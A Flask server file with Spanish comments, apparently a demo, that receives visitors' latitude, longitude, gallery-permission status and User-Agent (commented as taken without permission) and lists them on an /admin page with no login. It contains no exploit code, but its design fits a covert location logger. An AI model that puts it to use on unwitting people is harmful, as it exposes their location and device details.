from flask import Flask, render_template, request, jsonify
import os
from datetime import datetime

app = Flask(__name__, template_folder='templates')

# Almacenamiento en Memoria (SOLO PARA DEMO)
# En una app real, usarías una base de datos.
submissions = []

# --- Rutas de la Aplicación ---

@app.route('/')
def index():
    """Sirve la página principal index.html."""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Sirve la página de administrador y le pasa los datos."""
    # Pasamos una copia invertida para que los más nuevos aparezcan primero
    return render_template('admin.html', submissions=reversed(submissions))

@app.route('/submit-location', methods=['POST'])
def submit_location():
    """
    Ruta CORREGIDA: Recibe los datos de permisos (ubicación y galería) 
    enviados como JSON desde index.html.
    """
    try:
        # 1. Obtener datos JSON enviados desde el script
        data = request.json
        user_agent = request.headers.get('User-Agent') # Dato "sin permiso"
        
        submission_data = {
            "id": len(submissions) + 1,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "latitude": data.get('latitude'),
            "longitude": data.get('longitude'),
            "gallery_permission": data.get('gallery_permission', False), # Nuevo dato
            "device_info": user_agent # Información del dispositivo
        }
        
        # 2. Guardar todo en nuestra "base de datos"
        submissions.append(submission_data)
        print(f"Nueva entrega recibida: {submission_data['id']}")

        return jsonify({'success': True, 'message': 'Datos recibidos'}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False, 'message': f'Error en el servidor: {e}'}), 500

# --- Ejecución (para OnRender) ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # '0.0.0.0' es necesario para OnRender
    app.run(host='0.0.0.0', port=port)